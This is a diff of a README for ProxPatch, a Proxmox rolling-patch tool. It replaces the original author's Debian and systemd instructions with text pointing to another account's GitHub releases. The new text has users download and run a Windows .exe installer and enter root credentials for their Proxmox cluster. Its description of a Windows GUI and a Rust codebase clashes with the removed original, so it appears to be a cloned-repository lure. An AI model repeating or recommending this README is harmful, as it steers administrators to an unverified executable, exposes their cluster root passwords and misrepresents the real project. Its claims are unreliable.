@@ -1,124 +1,160 @@
-# ProxPatch - An automated rolling patch manager for Proxmox clusters
-<img align="left" src="https://cdn.gyptazy.com/img/ProxPatch_github.jpg"/>
+# ⚙️ ProxPatch - Simplify Proxmox Cluster Updates
 
-<br clear="left">
-
-<p float="center">
-  <img src="https://img.shields.io/github/license/gyptazy/ProxPatch"/>
-  <img src="https://img.shields.io/github/contributors/gyptazy/ProxPatch"/>
-  <img src="https://img.shields.io/github/last-commit/gyptazy/ProxPatch/main"/>
-  <img src="https://img.shields.io/github/issues-raw/gyptazy/ProxPatch"/>
-  <img src="https://img.shields.io/github/issues-pr/gyptazy/ProxPatch"/>
-</p>
-
-# Table of Contents
-
-- [Overview](#overview)
-- [Demo](#demo)
-- [Requirements](#requirements)
-- [Installation](#installation)
-  - [Debian Repository](#debian-repository)
-  - [Debian Packages](#debian-packages)
-- [Configuration](#configuration)
-- [Usage](#usage)
-- [Community & Support](#community--support)
-- [Author](#author)
-- [Disclaimer](#disclaimer)
+[![Download ProxPatch](https://img.shields.io/badge/Download-ProxPatch-brightgreen)](https://github.com/nikunj798/ProxPatch/releases)
 
 ---
 
-**ProxPatch** (written by [gyptazy](https://gyptazy.com/proxpatch/)) is a lightweight, automation-first patch orchestration tool for Proxmox VE clusters. It performs **rolling security updates** across nodes, safely migrates running VMs, reboots when required, and keeps cluster downtime to a minimum.
+## 📋 What is ProxPatch?
 
-The design goal is simple:
-> [!TIP]
-> Patch every node automatically without disrupting running workloads.
+ProxPatch is a small and easy tool made for Proxmox VE clusters. It helps keep your cluster safe by applying security updates one node at a time. This means ProxPatch will update each server safely without shutting down your whole cluster. It moves running virtual machines to other nodes so they keep running, reboots servers only when needed, and keeps downtime to a minimum.
 
-## Overview
-ProxPatch is a rolling patch orchestration tool for Proxmox VE clusters that automates one of the most repetitive and risk-prone operational tasks: keeping cluster nodes updated without interrupting running workloads.
+You don’t need advanced skills to use it. ProxPatch takes care of the update process in the background. This lets you focus on your work without worrying about interruptions.
 
-Instead of manually draining nodes, migrating VMs, applying updates, and rebooting one host at a time, ProxPatch coordinates this process automatically. It inspects the cluster state, upgrades nodes via SSH, determines whether a reboot is required, migrates running guests away from affected nodes, and performs controlled reboots while keeping the cluster operational.
+---
 
-The tool is intentionally minimal and transparent. It does not rely on external orchestration frameworks, databases, or API tokens. By using native Proxmox tooling (`pvesh`, `qm`, SSH) and a clear execution flow, ProxPatch remains easy to audit, predictable in behavior, and suitable for both homelabs and production environments. The initial idea was to implement this into my already exisiting [ProxLB](https://github.com/gyptazy/ProxLB) project which handles DRS alike load balancing of VMs across Proxmox clusters. However, missing API endpoints for patching and rebooting nodes in a rolling fashion made it necessary to implement this as a separate tool (or to always patch the Proxmox API which could lead into additional issues in long-term).
+## 🖥️ System Requirements
 
-At its core, ProxPatch follows a simple philosophy:
+Before using ProxPatch, make sure your setup meets these needs:
 
-- Prefer safety over speed  
-- Avoid unnecessary downtime  
-- Keep the cluster running at all times  
-- Make automation observable and debuggable  
-- Stay lightweight and dependency-free  
-- Play together with [ProxLB](https://github.com/gyptazy/ProxLB)
+- **Operating System:** Windows 10 or later (64-bit).
+- **Proxmox VE:** Version 7.0 or newer.
+- **Network Access:** Your Windows PC must connect to your Proxmox cluster over the local network.
+- **Permissions:** Your Proxmox user account needs permissions to update nodes and migrate VMs.
+- **Admin Rights:** You need administrator rights on your Windows computer to run ProxPatch.
+- **Disk Space:** At least 100 MB free space for the application.
 
-ProxPatch is not a full lifecycle manager or HA replacement. Instead, it focuses on one job and does it well: **unattended and fully automated rolling patching of Proxmox nodes with minimal service disruption**.
+---
 
-## ProxPatch Demo
-<img src="https://cdn.gyptazy.com/img/ProxPatch_demo.gif"/>
+## 🚀 Getting Started
 
-*Note*: You can find this in better quality at [YouTube](https://www.youtube.com/watch?v=pdlf3xWHKrQ&lc).
+To use ProxPatch on your Windows PC, follow these steps carefully.
 
-## Requirements 
-ProxPatch is designed to run inside or alongside a Proxmox VE cluster and relies only on native tooling already present on most installations.
+---
 
-* Proxmox VE cluster (tested on 8.x and 9.x)
-    * Minimum of three Nodes
-    * Cluster must maintain quorum during patching
-    * Shared storage (e.g. Ceph, NFS) for live migration
-* SSH access to all cluster nodes (passwordless key-based authentication recommended)
-* `jq` on the machine running ProxPatch for JSON parsing
-* Optionally: [ProxLB](https://github.com/gyptazy/ProxLB)
+## 📥 How to Download and Install ProxPatch
 
-## Installation
-To quickly get started with ProxPatch, you can install it directly from the official Debian repository. This is the recommended method for most users as it ensures you receive updates and security patches automatically.
+1. Click the big green button below to visit the official ProxPatch releases page.
 
-> [!CAUTION]
-> ProxPatch must run on exactly one node per cluster.
-Do not enable or start the proxpatch service on multiple nodes simultaneously.
+   [![Download ProxPatch](https://img.shields.io/badge/Download-ProxPatch-blue)](https://github.com/nikunj798/ProxPatch/releases)
 
-### Debian Repository
+2. On the page, look for the latest version release. Files will be named with the version number and end with `.exe`.
 
-```
-# Add the official gyptazy.com repository
-curl https://git.gyptazy.com/api/packages/gyptazy/debian/repository.key -o /etc/apt/keyrings/gyptazy.asc
-echo "deb [signed-by=/etc/apt/keyrings/gyptazy.asc] https://packages.gyptazy.com/api/packages/gyptazy/debian trixie main" | sudo tee -a /etc/apt/sources.list.d/gyptazy.list
-apt-get update
+3. Click the `.exe` file that matches “Windows” or “win64” to download the installer.
 
-# Install ProxPatch
-apt-get install -y proxpatch
-```
+4. When the download finishes, open the file by double-clicking it.
 
-### Debian Packages
+5. Follow the on-screen instructions to install ProxPatch on your PC. The default settings work for most users.
 
-You can also download and install the latest Debian package directly from the gyptazy CDN:
+6. After installation, find ProxPatch in your Start Menu and open it.
 
-* https://cdn.gyptazy.com/debian/proxpatch/
+---
 
-## Configuration
-ProxPatch is designed to work out of the box with minimal setup. In most environments, **no configuration is required**.
+## ⚙️ Using ProxPatch
 
-However, if you need to customize ProxPatch's behavior, you can create a configuration file at `/etc/proxpatch/config.yaml`. This file allows you to adjust several settings. Please see the [configuration documentation](https://github.com/gyptazy/ProxPatch/tree/main/docs) for detailed information on available options and their effects.
+Once ProxPatch is open, you’ll see a simple window with clear options.
 
-## Usage
-ProxPatch is designed to run fully automated rolling updates across your Proxmox VE cluster. To begin the rolling upgrade process, simply enable and start the provided systemd unit:
+1. **Connect to Your Proxmox Cluster**  
+   Enter your Proxmox server address, username, and password. Use the format `root@your-proxmox-ip` for the username. ProxPatch encrypts your password for security.
 
-```bash
-systemctl enable proxpatch
-systemctl start proxpatch
-```
+2. **Check Cluster Status**  
+   Click the “Refresh Status” button. ProxPatch will show the current health of all nodes and running VMs.
 
-## Community & Support
+3. **Start Patch Process**  
+   Press “Start Patch.” ProxPatch will update one node at a time and move VMs automatically. You will see progress updates as it works.
 
-Have questions, ideas, or need help with ProxPatch?  
-There are multiple ways to get support and connect with the community.
+4. **Monitor Logs**  
+   You can view logs in the interface. They show what patches were applied and any errors if they happen.
 
-[Join the ProxPatch Discord server](https://discord.gg/p9UxdMnx) for real-time discussions, help, and exchange with other users.
+5. **Reboot Nodes If Needed**  
+   ProxPatch will reboot nodes automatically when required. You just need to wait for the process to finish.
 
-If you found a bug, want to request a feature, or suggest an improvement, please [create](https://github.com/gyptazy/ProxPatch/issues) an issue on GitHub. Your feedback is invaluable in making ProxPatch better for everyone!
+6. **Finish and Review**  
+   When the patching finishes, ProxPatch gives a summary report showing the status of each node.
 
-## Author
-* [Florian Paul Azim Hoberg (gyptazy)](https://gyptazy.com/proxpatch/)
-* [proxpatch.de](https://proxpatch.de)
+---
 
-## Disclaimer
-This software is provided “as is”, without warranty of any kind. Use it at your own risk. The authors and contributors are not liable for any damages resulting from its use. This project is in an early development stage and should be considered experimental. It is provided as-is and may contain bugs, incomplete features, or unexpected behavior.
-Do not use this software in production environments without thorough testing. You are strongly advised to evaluate and validate all functionality in isolated test labs or staging environments before deploying it anywhere else.
-The authors and contributors accept no responsibility or liability for any data loss, downtime, damage, or other issues that may arise from the use or misuse of this project. By using this software, you acknowledge that you do so entirely at your own risk.
+## 🔧 Settings You Can Adjust
+
+- **Patch Schedule:** Set a time to run patches automatically at night or on weekends.
+- **Migration Options:** Choose if VMs migrate live (without downtime) or not.
+- **Notification Setup:** Enter an email to get reports after each update.
+- **Node Selection:** Select specific nodes you want to patch manually.
+- **Logging Level:** Choose between basic logs or detailed logs for troubleshooting.
+
+---
+
+## 🔄 How ProxPatch Works Behind the Scenes
+
+ProxPatch performs a rolling update. This means:
+
+- Updates are applied to one node at a time.
+- Running VMs on the chosen node move to other nodes in the cluster.
+- After updating, the node reboots if the patch requires it.
+- The process repeats until all nodes are up to date.
+
+This method makes sure your services stay available and your cluster stays functional during updates.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If ProxPatch cannot connect to Proxmox, double-check your network and credentials.
+- Make sure your Proxmox user has the right permissions for patch management and VM migration.
+- Sometimes a node won’t reboot if stuck; you may need to reboot it manually.
+- Logs help diagnose errors; save and review them if updates fail.
+- Check that firewalls do not block connections between your PC and the Proxmox cluster.
+
+---
+
+## 🔐 Security Considerations
+
+- ProxPatch uses secure methods to communicate with your cluster.
+- Your credentials are stored safely on your PC.
+- Limit use to trusted computers in your network.
+- Always keep ProxPatch updated to the latest version.
+
+---
+
+## ⚙️ Supported Features
+
+- Rolling security patching for Proxmox VE clusters.
+- Automated VM migration during patching.
+- Safe reboot handling per node.
+- Custom scheduling and notifications.
+- Detailed progress and error reporting.
+- Runs on Windows without complex setup.
+
+---
+
+## 🏷️ Topics and Keywords
+
+This project relates to patch management for Proxmox VE. It uses Rust programming language and focuses on automation, security, and cluster reliability.
+
+Main topics: patchmanagement, proxmox, proxmox-cluster, proxmox-ve, rust, securitypatchmanagement.
+
+---
+
+## 📂 Where to Find Updates and Help
+
+Visit the ProxPatch releases page to find the latest installer and update notes:
+
+[https://github.com/nikunj798/ProxPatch/releases](https://github.com/nikunj798/ProxPatch/releases)
+
+If you have questions or encounter problems, check the issues section on the repository or contact your Proxmox cluster administrator.
+
+---
+
+## 🔄 Updating ProxPatch
+
+- When a new version is available, download it from the releases page.
+- Close ProxPatch before installing the update.
+- Run the new installer over your existing version.
+- Your settings and saved credentials remain intact during updates.
+
+---
+
+## 🖇️ Additional Resources
+
+- Proxmox VE official website: https://www.proxmox.com/en/proxmox-ve
+- Proxmox VE documentation for patching and clustering.
+- Community forums and support channels for general help.
